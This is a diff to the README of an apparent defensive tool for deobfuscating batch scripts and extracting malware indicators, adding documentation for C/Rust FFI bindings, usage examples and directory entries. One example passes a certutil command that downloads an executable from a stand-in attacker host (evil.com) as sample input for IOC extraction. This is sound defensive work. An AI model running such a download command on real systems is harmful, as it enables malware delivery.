@@ -36,6 +36,7 @@
 - [🧬 Ghidra Binary Reverse Engineering Forensics](#ghidra-binary-reverse-engineering)
 - [🚨 Detection Engineering (YARA & Sigma Rules)](#detection-engineering-rules)
 - [🚀 Quickstart & CLI Usage](#quickstart-cli-usage)
+- [⚡ High-Performance Native C/Rust FFI Bindings & Standalone Binary API](#native-c-rust-ffi-bindings)
 - [📊 Automated Invariant Verification & Benchmarks](#automated-invariant-verification)
 - [📁 Repository Architecture](#repository-architecture)
   - [📁 Repository Architecture & Directory Map](#repository-architecture-directory-map)
@@ -476,8 +477,88 @@ python src/cli.py -i malware.bat --ioc --ioc-filter url,ipv4,file_drop,lolbin --
 # Execute real-world deobfuscation benchmark suite across 12 adversarial patterns
 python src/cli.py --benchmark
 
+# Export official C ABI header to specified target path
+python src/cli.py --ffi-export-header include/cmd_deobfuscator.h
+
+# Execute native C/Rust FFI acceleration and memory zeroize roundtrip verification
+python src/cli.py --ffi-test-roundtrip
+
 # Run benchmark evaluation with JSON report export
 python src/cli.py --benchmark --benchmark-engine ast --benchmark-export benchmark_report.json
+```
+
+---
+
+<span id="native-c-rust-ffi-bindings"></span>
+## ⚡ High-Performance Native C/Rust FFI Bindings & Standalone Binary API
+
+For high-throughput incident response workflows, SIEM ingestion pipelines, and cross-language toolchains (C, C++, Rust, Go, Python), `cmd-ast-deobfuscator` provides native compiled acceleration via a Rust core (`rust/`) and a standard C ABI interface (`include/cmd_deobfuscator.h`).
+
+### 📦 Native Shared Library Compilation (`cdylib`)
+
+```bash
+# Compile optimized native dynamic library (.dll / .so / .dylib)
+cargo build --release
+
+# Run Rust native unit tests and FFI lifecycle verification
+cargo test --all-targets
+```
+
+### 🧩 C ABI Header Interface (`include/cmd_deobfuscator.h`)
+
+The C ABI provides thread-safe opaque context handles, quantitative performance telemetry, and secure memory zeroization:
+
+```c
+#include "cmd_deobfuscator.h"
+#include <stdio.h>
+
+int main(void) {
+    cmd_ffi_context_t* ctx = NULL;
+    cmd_ffi_options_t options = {
+        .flags = CMD_FFI_FLAG_ALL_OPTIMIZATIONS,
+        .max_passes = 10,
+        .timeout_ms = 5000,
+        .max_unroll_depth = 100
+    };
+
+    if (cmd_ffi_context_create(&options, &ctx) != CMD_FFI_OK) {
+        return 1;
+    }
+
+    const char* payload = "c^m^d.e^x^e /c echo Pwnd";
+    cmd_ffi_result_t* result = NULL;
+    if (cmd_ffi_deobfuscate(ctx, payload, 0, 0, &result) == CMD_FFI_OK) {
+        printf("Deobfuscated: %s\n", cmd_ffi_result_get_text(result));
+        cmd_ffi_result_free(result);
+    }
+
+    cmd_ffi_context_destroy(ctx);
+    return 0;
+}
+```
+
+### 🐍 Python Unified FFI Bridge (`src.ffi`)
+
+The Python subsystem automatically utilizes the native compiled library when available, seamlessly falling back to the pure-Python AST pushdown automaton with 100% semantic equivalence:
+
+```python
+from src.ffi import CmdDeobfuscatorBridge, FFIFlags, zeroize_buffer
+
+bridge = CmdDeobfuscatorBridge()
+print(f"Native Acceleration Active: {bridge.is_native_accelerated}")
+
+# Ultra-fast batch deobfuscation
+res = bridge.deobfuscate("c^m^d.e^x^e /c echo Pwnd", flags=FFIFlags.ALL_OPTIMIZATIONS)
+print(f"Clean Code: {res.text}")
+print(f"Execution Time: {res.metrics.to_dict()['elapsed_ms']} ms")
+
+# Malware IOC extraction and defanging
+ioc_res = bridge.extract_iocs("certutil -urlcache -f http://evil.com/drop.exe", flags=FFIFlags.DEFANG_IOCS)
+print(f"Extracted IOCs: {ioc_res.text}")
+
+# Memory security zeroization
+secret_buffer = bytearray(b"SENSITIVE_BATCH_TOKEN")
+zeroize_buffer(secret_buffer)
 ```
 
 ---
@@ -485,7 +566,7 @@ python src/cli.py --benchmark --benchmark-engine ast --benchmark-export benchmar
 <span id="automated-invariant-verification"></span>
 ## 📊 Automated Invariant Verification & Benchmarks
 
-The test suite validates 484 fundamental compiler, lexer, automaton, AST normalization, delayed expansion (`!VAR!`), caret normalization, substring slicing, FOR loop parameter modifier resolution (`%~dp0`, `%~f1`), Control Flow Graph (CFG) jump table construction, Dead Code Elimination (DCE), Arithmetic Expression Folding (`set /a`), String Reversal and Transposition Automata, Quote Toggle Boundary Normalization, I/O Redirection Stream Routing, Invoke-DOSfuscation Concatenation Heuristics, 0xidiz3r & Batch Packer Signature Detection, Control Flow De-flattening (Anti-CFF), Intermediate Representation (IR) Multi-Target Transpiler (Python 3 & PowerShell), Interactive Terminal AST Inspector & Colored Diff Visualizer (TUI Debugger), High-Throughput Directory Batch Scanner & Bulk Deobfuscation Pipeline, AST-based Malware IOC Extractor (M18), and real-world benchmark invariants:
+The test suite validates 508 fundamental compiler, lexer, automaton, AST normalization, delayed expansion (`!VAR!`), caret normalization, substring slicing, FOR loop parameter modifier resolution (`%~dp0`, `%~f1`), Control Flow Graph (CFG) jump table construction, Dead Code Elimination (DCE), Arithmetic Expression Folding (`set /a`), String Reversal and Transposition Automata, Quote Toggle Boundary Normalization, I/O Redirection Stream Routing, Invoke-DOSfuscation Concatenation Heuristics, 0xidiz3r & Batch Packer Signature Detection, Control Flow De-flattening (Anti-CFF), Intermediate Representation (IR) Multi-Target Transpiler (Python 3 & PowerShell), Interactive Terminal AST Inspector & Colored Diff Visualizer (TUI Debugger), High-Throughput Directory Batch Scanner & Bulk Deobfuscation Pipeline, AST-based Malware IOC Extractor, Native C/Rust FFI Bindings & Standalone Binary Distribution Pipeline, and real-world benchmark invariants:
 
 
 ```bash
@@ -631,6 +712,30 @@ OK
       <td>Version Control</td>
       <td>Production Git exclusions covering bytecode, cache, memory journals, and IDE files</td>
     </tr>
+    <tr>
+      <td><strong><code>Cargo.toml</code></strong></td>
+      <td>Rust Package Manifest</td>
+      <td>Crate manifest for native high-performance Rust acceleration core and C ABI cdylib</td>
+    </tr>
+    <!-- include/ & rust/ -->
+    <tr>
+      <td colspan="3" bgcolor="#0f172a"><strong>⚡ <code>include/</code> &amp; <code>rust/</code> — Native Acceleration &amp; C ABI Interface</strong></td>
+    </tr>
+    <tr>
+      <td><strong><code>include/cmd_deobfuscator.h</code></strong></td>
+      <td>C ABI Specification</td>
+      <td>Standard C99/C11 header declaring opaque context handles, execution options, quantitative telemetry, and memory zeroization</td>
+    </tr>
+    <tr>
+      <td><strong><code>rust/lib.rs</code></strong></td>
+      <td>Rust Native Core</td>
+      <td>Zero-copy caret stripping, fast-path delimiter folding, Shannon entropy deltas, and secure volatile memory zeroize</td>
+    </tr>
+    <tr>
+      <td><strong><code>rust/ffi.rs</code></strong></td>
+      <td>C ABI Bindings</td>
+      <td>Exported <code>extern "C"</code> ABI entry points matching <code>cmd_deobfuscator.h</code></td>
+    </tr>
     <!-- src/ -->
     <tr>
       <td colspan="3" bgcolor="#0f172a"><strong>⚙️ <code>src/</code> — Core AST Engine &amp; Compiler Pipeline</strong></td>
@@ -726,6 +831,11 @@ OK
       <td>AST-based malware indicator extraction engine, LOLBins registry, MITRE ATT&amp;CK behavior mapping, automated defanging, and STIX 2.1 threat intelligence exporter</td>
     </tr>
     <tr>
+      <td><strong><code>src/ffi/</code></strong></td>
+      <td>FFI &amp; Native Bridge</td>
+      <td>Unified C/Rust FFI subsystem providing ctypes data structures, bridge dispatch, memory zeroization, and standalone verifier</td>
+    </tr>
+    <tr>
       <td><strong><code>src/visualizer.py</code></strong></td>
       <td>Visualizer Engine</td>
       <td>Multi-target visualizer emitting ASCII syntax trees, Mermaid flowcharts, and JSON</td>
@@ -808,6 +918,11 @@ OK
       <td><strong><code>tests/test_ioc_suite.py</code></strong></td>
       <td>Malware IOC Extractor Tests</td>
       <td>Unit &amp; integration tests for IPv4/IPv6, URLs, domains, PE/script drops, LOLBins, MITRE ATT&amp;CK mapping, defanging, multi-format exports (JSON, CSV, MD, STIX 2.1), and CLI flags</td>
+    </tr>
+    <tr>
+      <td><strong><code>tests/test_ffi_suite.py</code></strong></td>
+      <td>C/Rust FFI Tests</td>
+      <td>Unit &amp; integration tests for C ABI structures, Rust native core bindings, Python bridge fallback, memory zeroization, and CLI flags</td>
     </tr>
     <!-- Auxiliary Directories -->
     <tr>
